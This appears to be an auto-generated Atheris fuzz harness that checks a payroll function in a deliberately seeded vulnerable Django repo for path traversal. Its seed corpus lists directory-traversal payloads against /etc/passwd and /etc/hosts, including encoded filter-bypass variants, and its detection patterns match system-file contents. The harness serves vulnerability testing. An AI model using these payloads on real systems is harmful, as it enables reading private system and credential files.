# AUTO-GENERATED ATHERIS HARNESS
# rule_id  : py/path-injection
# function : payroll_fold_drop_014
# file     : hr_portal/payroll_operations.py
# ================================================================
import atheris
import sys
import re
import os



REPO_ROOT = "/home/trieudai/VulnHunterX/repos/python/vc-claude-code-seeded-v2-hr-payroll-django"
if REPO_ROOT and REPO_ROOT not in sys.path:
    sys.path.insert(0, REPO_ROOT)

with atheris.instrument_imports():

    from hr_portal.payroll_operations import payroll_fold_drop_014


# === FIXED CONTRACTS (DO NOT MODIFY) ===
_COMPILED_PATTERNS = [

    re.compile("root:x:0:0:", re.IGNORECASE),

    re.compile("127\\.0\\.0\\.1\\s+localhost", re.IGNORECASE),

    re.compile("root:.*:0:0:.*:/root", re.IGNORECASE),

]
_RAISE_MESSAGE  = "PY_PATH_INJECTION: directory traversal confirmed — captured={captured} pattern={matched_pattern}"
_TAINTED_PARAMS = [{"name": "request", "index": 0, "type": "str"}]
# ========================================

# === ORACLE CONTEXT ===
# strategy         : return_value
# patch_target     : None
# target_arg_index : None
# target_arg_name  : None
# input_strategy   : direct_params
# signature        : def payroll_fold_drop_014(request)
# condition        : The returned file content contains known patterns from sensitive system files (e.g., /etc/passwd root entry or /etc/hosts loopback entry), confirming that directory traversal via ../ in packet_ref successfully read an out-of-bounds file
# capture_what     : return value of payroll_fold_drop_014, which is the content read from the traversed file path
# skip_hint        : False
# ========================================


# === RETURN_VALUE SKELETON ===
# TODO: Complete TestOneInput following these steps:
# 1. Generate inputs using FuzzedDataProvider.
# 2. Apply skip_hint (if applicable).
# 3. Call target function directly and capture the return value.
# 4. Extract string content from the return value (based on capture_what).
# 5. Compare captured string against _COMPILED_PATTERNS.
# 6. Propagate RuntimeError; swallow other exceptions.
# ==========================================



def TestOneInput(data):
    fdp = atheris.FuzzedDataProvider(data)
    # NOTE: For string inputs, use fdp.ConsumeBytes(1024).decode('utf-8', errors='ignore')
    #       instead of ConsumeUnicodeNoSurrogates() to preserve raw seed payloads.
    
    request_val = fdp.ConsumeBytes(len(data)).decode('utf-8', errors='ignore')

    try:
        result = payroll_fold_drop_014(request_val)
    except RuntimeError:
        raise
    except Exception:
        return

    if result is None:
        return
    if not isinstance(result, str):
        return

    for pattern in _COMPILED_PATTERNS:
        match = pattern.search(result)
        if match:
            captured = result[max(0, match.start() - 20):match.end() + 20]
            raise RuntimeError(
                _RAISE_MESSAGE.format(captured=captured, matched_pattern=pattern.pattern)
            )


# === SEED CORPUS — bypass-oriented, derived from trigger_patterns ===
# LLM: populate _SEED_CORPUS with entries designed to SURVIVE the filter,
# not just trigger it. Cover: mixed case, whitespace injection, unicode
# homoglyphs, double encoding, tag nesting, attribute abuse.
_SEED_CORPUS = [
    b"../../../etc/passwd",
    b"..%2f..%2f..%2fetc%2fpasswd",
    b"....//....//....//etc//passwd",
    b"..%252f..%252f..%252fetc%252fpasswd",
    b"\x00../../../etc/passwd",
    b"..\/..\/..\/etc\/passwd",
    b"../../../etc/hosts",
    b"..%2f..%2f..%2fetc%2fhosts",
    b"....//....//....//etc//hosts",
    b"..\\..\\..\\..\\etc\\passwd",
    b"/..%252f..%252f..%252fetc%252fpasswd",
    b"..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
]


if __name__ == "__main__":
    # Export seed corpus to disk so libFuzzer can mutate raw bytes directly.
    # This preserves coverage-guided mutation — fuzzer mutates content, not index.
    _CORPUS_DIR = "output/python/vc-claude-code-seeded-v2-hr-payroll-django/fuzz_corpus/py_path_injection_hr_portal_payroll_operations_py_42"
    os.makedirs(_CORPUS_DIR, exist_ok=True)
    for _i, _seed in enumerate(_SEED_CORPUS):
        _seed_path = os.path.join(_CORPUS_DIR, f"seed_{_i:03d}")
        if not os.path.exists(_seed_path):
            with open(_seed_path, "wb") as _f:
                _f.write(_seed.encode("utf-8") if isinstance(_seed, str) else _seed)

    if _CORPUS_DIR not in sys.argv:
        sys.argv.append(_CORPUS_DIR)

    atheris.Setup(sys.argv, TestOneInput)
    atheris.Fuzz()